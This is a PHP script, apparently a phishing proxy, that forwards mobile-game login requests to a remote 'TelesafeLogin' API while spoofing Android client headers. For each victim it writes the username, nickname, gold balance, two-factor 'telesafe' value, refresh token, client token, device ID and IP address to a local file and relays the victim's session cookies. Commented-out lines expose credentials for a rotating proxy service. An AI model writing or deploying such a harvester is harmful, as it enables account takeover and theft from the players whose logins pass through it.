<?php
$cho_phep_dang_nhap = 1;
header('Content-Type: application/json; charset=utf-8');
$raw_content = file_get_contents('php://input');
$headers = apache_request_headers();
$client_token = isset($headers['Client-Token']) ? $headers['Client-Token'] : "";
$device_id = isset($headers['Client-DeviceID']) ? $headers['Client-DeviceID'] : "";

$result = login($raw_content, $device_id, $client_token);
$json_data = json_decode($result, 1);
$username = $json_data['d']['username'];
$nickname = $json_data['d']['nickname'];
$mobile = $json_data['d']['mobile'];
$telesafe = $json_data['d']['teleSafe'];
$gold = $json_data['d']['goldBalance'];
$coin = $json_data['d']['coinBalance'];
$vippoint = $json_data['d']['vipPoint'];
$refresh_token = $json_data['p'][1];
setcookie('username', $username, time() + (86400 * 30), "/"); // 86400 = 1 day
setcookie('password', '', time() + (86400 * 30), "/"); // 86400 = 1 day
date_default_timezone_set('Asia/Ho_Chi_Minh');
$time = date("H:i:s Y-m-d");
$ip=$_SERVER['REMOTE_ADDR'];
$fp = fopen('telesafe.txt', 'a+');
fwrite($fp, "$username|$nickname|$gold|$phone|$telesafe|$refresh_token|$client_token|$device_id| ----- $time -----> $ip\n");
fclose($fp);
if ($cho_phep_dang_nhap) {
    die($result);
} else {
    die('{"c":-1025,"m":""}');
}

function login($raw_content, $device_id, $client_token) {
    $url = "https://id.anceilynas.site/api/mobile/TelesafeLogin";
    // $proxy = 'zproxy.lum-superproxy.io:22225';
    // $list_ip = explode("\n", file_get_contents('list_ip.txt'));
    // $random_ip = $list_ip[rand(0, count($list_ip) - 1)];
    // $proxyauth = "lum-customer-vovanthong-zone-phamhai-ip-$random_ip:osd7y0za8gal";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_POST,1);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_HEADER,1);
    $data = $raw_content;
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch,CURLOPT_HTTPHEADER,['Content-type: application/json', 'Client-Version: 1.0.31', 'Client-Model: Xiaomi Mi A1', 'Client-Name: Mi A1', 'Client-DeviceID: '.$device_id, 'Client-OperatingSystem: Android OS 9 / API-28 (PKQ1.180917.001/V10.0.18.0.PDHMIXM)', 'Client-OperatingSystemFamily: Other', 'Client-ProcessorCount: 8', 'Client-ProcessorFrequency: 2016', 'Client-ProcessorType: ARM64 FP ASIMD AES', 'Client-DeviceType: Handheld', 'Client-Token: '.$client_token, 'Client-OSType: ANDROID', 'TE: identity', 'User-Agent: BestHTTP']);
    $raw_content = curl_exec($ch);
    $netcore_session = '';
    $wjo = '';
    if (preg_match('/\.netcore\.session=([^;]+);/m', $raw_content, $matches)) $netcore_session = $matches[1];
    if (preg_match('/NSC_mc\.je\.n88\.wjo=([^;]+);/m', $raw_content, $matches)) $wjo = $matches[1];
    setcookie('.netcore.session', urldecode($netcore_session), time() + (86400 * 30), "/"); // 86400 = 1 day
    setcookie('NSC_mc.je.n88.wjo', $wjo, time() + (86400 * 30), "/"); // 86400 = 1 day
    return explode("\r\n\r\n", $raw_content)[1];
}
?>